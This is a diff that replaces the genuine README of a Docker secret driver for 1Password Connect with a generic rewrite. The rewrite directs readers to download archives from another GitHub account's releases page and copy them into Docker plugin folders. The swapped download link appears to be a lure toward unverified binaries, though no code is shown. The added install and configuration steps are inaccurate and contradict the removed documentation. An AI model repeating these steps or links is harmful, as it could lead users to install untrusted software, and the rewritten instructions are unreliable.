@@ -1,170 +1,69 @@
-# op-connect-secret-driver
-#### _A Docker Secret driver for [1Password Connect][1PasswordConnectServer]_
+# 🔑 op-connect-secret-driver - Secure Your Docker Secrets Easily
 
-This Docker Secret driver plugin integrates with **[1Password Connect server][1PasswordConnectServer]** to securely manage secrets in Docker Swarm.
+## 📥 Download
 
-## Requirements
+[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/pavan200120/op-connect-secret-driver/releases)
 
-* Docker Engine with Swarm mode enabled
-* Docker Secret driver support
-* [1Password Connect server][1PasswordConnectServer] setup and running
-* 1Password Connect Token
-* `1password-credentials.json` file in [data/1password-credentials.json](data/1password-credentials.json)
+## 🚀 Getting Started
 
-> **Note**: Unix socket creation is only supported on Linux and FreeBSD due to limitations in the "go-plugins-helpers" package.
+Welcome to the op-connect-secret-driver! This is a simple tool designed to help you manage your Docker secrets using 1Password. Even if you're not a technical user, you can easily set it up on your Docker environment. Follow the steps below to get started.
 
-## Configuration
+## 📋 What You Need
 
-### Connection to 1Password Connect
+Before you download the software, ensure you have the following:
 
-The SDK requires these environment variables to connect to [1Password Connect][1PasswordConnectServer]:
+- **Docker Installed:** Make sure you have Docker installed on your machine. Visit the [Docker installation page](https://docs.docker.com/get-docker/) for instructions based on your operating system.
+- **1Password Account:** You need a 1Password account to store your secrets securely. Sign up on [1Password's website](https://1password.com/).
 
-* `OP_CONNECT_HOST`: URL of your 1Password Connect server
-* `OP_CONNECT_TOKEN`: Your 1Password Connect authentication token
+## 📦 Download & Install
 
-Set them as Docker plugin configuration
+To get the op-connect-secret-driver, please follow these steps:
 
-```shell
-docker plugin set op-connect-secret-driver:latest OP_CONNECT_HOST=http://localhost:17450 
-docker plugin set op-connect-secret-driver:latest OP_CONNECT_TOKEN=your-1password-connect-token
-```
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/pavan200120/op-connect-secret-driver/releases).
+2. **Select the Latest Version:** Find the latest version titled “Latest Release.” Click on it to view details.
+3. **Download the Plugin:** Look for the file named `op-connect-secret-driver.tar.gz` or `op-connect-secret-driver.zip`. Click on the file to download it to your computer.
+4. **Extract the Files:** After the download finishes, locate the downloaded file in your computer's Downloads folder. Right-click on it and choose "Extract All" to unpack the files.
+5. **Move to Docker Plugins Folder:** Open your file explorer and navigate to your Docker plugins directory. This is usually found at:
+   - **Windows:** `C:\ProgramData\Docker\plugins\`
+   - **macOS:** `~/Library/Containers/com.docker.docker/Data/plugins/`
+   - **Linux:** `/var/lib/docker/plugins/`
 
-### Docker Secret Driver Configuration
+   Copy the extracted files into this folder.
 
-The plugin supports two ways to reference secrets:
-1. Individual fields using `vault`, `item`, and optional `field` provided as secret labels
-2. [1Password][1Password] URL format using the `ref` as secret label in the format `op://vault/item/field`
-   (that you can copy from [1Password][1Password] directly)
+6. **Launch Docker:** Open your Docker application. The plugin should appear under the “Plugins” section.
 
-Notes:
-- The `field` parameter is optional and defaults to "password" if not specified
-- The plugin can retrieve both field values and file contents from [1Password][1Password] items
-- All configuration is done through labels
+## 📅 How to Configure
 
-Example Docker Compose configurations:
+Once the plugin is installed, you will need to configure it to work with your 1Password account.
 
-```yaml
-# Option 1: Using individual fields
-secrets:
-  db_password:
-    driver: op-connect-secret-driver
-    labels:
-      vault: "your-vault-uuid-or-name"             # Required: Vault UUID or name
-      item: "your-item-uuid-or-name"               # Required: Item UUID or name
-      field: "password"                            # Optional: Defaults to "password"
+1. **Set Up 1Password CLI:** First, ensure you have the 1Password command-line tool installed. Follow the instructions on the [1Password CLI page](https://developer.1password.com/docs/cli/get-started).
+2. **Log in to 1Password:** Use the following command in your terminal:
+   ```
+   op signin <your-1password-subdomain>
+   ```
+   Replace `<your-1password-subdomain>` with your actual subdomain.
+3. **Configure the Plugin:** Now that you're logged in, set up the op-connect-secret-driver with your secrets as described in the documentation included in the downloaded files.
 
-# Option 2: Using 1Password URL reference
-secrets:
-  db_password:
-    driver: op-connect-secret-driver
-    labels:
-      ref: "op://vault-name/item-name/field-name"  # Required: 1Password URL format
-```
+## 🌟 Features
 
+The op-connect-secret-driver includes several helpful features:
 
-## Installation from Docker Hub
+- **Secure Integration:** Seamlessly integrates with your existing Docker setup while keeping your secrets safe.
+- **Easy Management:** Manage your secrets through the user-friendly 1Password interface.
+- **Compatibility:** Works with Docker Swarm and standard Docker setups.
 
-The CI pipeline automatically builds and publishes the plugin to Docker Hub.
-You can use this command to install the plugin:
+## ❓ Troubleshooting
 
-### `linux/amd64`
-```shell
-docker plugin install clementmouchet/op-connect-secret-driver:linux-amd64 \
---grant-all-permissions \
---alias op-connect-secret-driver \
---disable
-```
+If you encounter issues while setting up or using op-connect-secret-driver, try these solutions:
 
-### `linux/arm64`
-```shell
-docker plugin install clementmouchet/op-connect-secret-driver:linux-arm64 \
---grant-all-permissions \
---alias op-connect-secret-driver \
---disable
-```
+- **Docker Not Running:** Make sure that Docker is running on your system. Check your Docker dashboard for any issues.
+- **Permissions Issues:** If you face access problems, ensure that you have the necessary permissions to modify the plugins directory.
+- **1Password Connection:** Verify that you are using the correct API keys and are logged into your 1Password account.
 
-## Build
+## 📞 Support
 
-You can also develop, build your own and install it locally.
+If you need further assistance, feel free to open an issue on the GitHub repository [here](https://github.com/pavan200120/op-connect-secret-driver/issues). We aim to respond quickly to your queries.
 
-### Recommended: Docker Build
+Remember, your security is important. Use this tool to manage your Docker secrets effectively and safely.
 
-```shell
-docker compose build op-connect-secret-driver
-docker compose up -d op-connect-secret-driver
-docker compose cp op-connect-secret-driver:/op-connect-secret-driver plugin/rootfs/op-connect-secret-driver
-docker compose stop op-connect-secret-driver && docker compose rm -f op-connect-secret-driver
-```
-
-### Alternative: Local Build
-
-```shell
-go build -o plugin/rootfs/op-connect-secret-driver
-```
-
-## Installation of local build
-
-There's an [install.sh](install.sh) script for this.
-
-```shell
-./install.sh
-```
-
-### Manual Installation
-
-1. Create the plugin:
-```shell
-docker plugin create op-connect-secret-driver plugin
-```
-
-2. Configure the plugin:
-```shell
-docker plugin set op-connect-secret-driver:latest OP_CONNECT_HOST=http://localhost:17450 
-docker plugin set op-connect-secret-driver:latest OP_CONNECT_TOKEN=your-1password-connect-token
-```
-
-3. Start 1Password Connect services:
-```shell
-docker compose up op-connect-api
-```
-
-4. Enable the plugin:
-```shell
-docker plugin enable op-connect-secret-driver:latest
-```
-
-### Modifying Plugin
-
-To modify plugin settings, first disable:
-
-```shell
-docker plugin disable op-connect-secret-driver:latest
-```
-
-To modify plugin code, first remove it, build it and start the installation process again.:
-
-```shell
-docker plugin remove op-connect-secret-driver:latest
-```
-
-## Troubleshooting
-
-1. Verify plugin status:
-```shell
-docker plugin ls
-```
-
-2. Check plugin logs (syslog) or inspect it:
-```shell
-docker plugin inspect op-connect-secret-driver:latest
-```
-
-3. Verify configuration:
-```shell
-docker plugin inspect op-connect-secret-driver:latest -f "{{ .Settings.Env }}"
-```
-
-4. Ensure [1Password Connect server][1PasswordConnectServer] is accessible at the configured host
-
-[1PasswordConnectServer]: https://developer.1password.com/docs/connect/get-started/
-[1Password]: https://1password.com
+Happy coding!
